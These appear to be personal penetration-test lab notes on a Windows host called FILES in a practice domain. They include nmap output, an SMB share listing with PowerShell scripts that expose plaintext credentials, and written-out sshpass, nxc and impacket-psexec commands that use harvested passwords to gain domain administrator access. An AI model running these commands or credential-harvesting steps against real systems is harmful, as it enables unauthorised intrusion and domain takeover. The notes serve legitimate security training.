# FILES .21 \[W, Pwned]

## Enumeration

```
Nmap scan report for 172.16.162.21
Host is up (0.00011s latency).
Not shown: 65523 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-20T09:20:51
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: FILES, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:94:44 (VMware)
| Names:
|   FILES<20>            Flags: <unique><active>
|   FILES<00>            Flags: <unique><active>
|_  RELIA<00>            Flags: <group><active>
```

### Files

Scripts share

```
smbclient -U 'relia.com\\mountuser' //172.16.162.21/scripts
Password for [mountuser]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Oct 20 04:06:17 2022
  ..                                DHS        0  Sat Dec 20 06:48:45 2025
  ForceADReplication.ps1              A      437  Thu Oct 20 10:47:57 2022
  Get-ADComputers-BitLockerInfo.ps1      A     6320  Thu Oct 20 10:48:00 2022
  UserExpire - Copy - Copy.ps1        A      481  Thu Oct 20 10:48:03 2022
  UserExpire - Copy.ps1               A      280  Thu Oct 20 10:48:06 2022
  UserExpire.ps1                      A      317  Thu Oct 20 10:48:11 2022
  Windows10Scrub.ps1                  A    34612  Thu Oct 20 10:48:14 2022
  workaround-36934-2021.ps1           A     2822  Thu Oct 20 10:48:18 2022

```

```
cat 'UserExpire - Copy - Copy.ps1'
##Sets expiration date and time for Active Directory User.

$user = "RELIA\john.m"
$SecureString = ConvertTo-SecureString "YouWillNeverTakeMyTractor!1922" -AsPlainText -Force
$creddent = New-Object System.Management.Automation.PSCredential($user, $SecureString)
Set-ADAccountExpiration -Identity $user -Credential $creddent -DateTime '17/01/2030 17:00:00'
Get-ADUser -Identity $user -Properties AccountExpirationDate | Select-Object -Property SamAccountName, AccountExpirationDate

```

Apps share

```
smbclient -U 'relia.com\\mountuser' //172.16.162.21/apps
Nothing Crazy
```

Monitoring share

```
$spass = ConvertTo-SecureString "vau!XCKjNQBv2$" -AsPlaintext -Force
$cred = New-Object System.Management.Automation.PSCredential("RELIA\Administrator", $spass)
```

### Ports

### Exploits

### Loot

## Initial Foothold

`sshpass -p "DRtajyCwcbWvH/9" ssh mountuser@172.16.10.21`

```
nxc smb 172.16.162.21 -u mountuser -p 'DRtajyCwcbWvH/9' --shares
```

It is a domain user after all

## PrivEsc

```
Administrator:vau!XCKjNQBv2$
```

```
impacket-psexec relia.com/Administrator:'vau!XCKjNQBv2$'@172.16.162.21
```

## Post Exploitation

You just got the domain admin password buddy
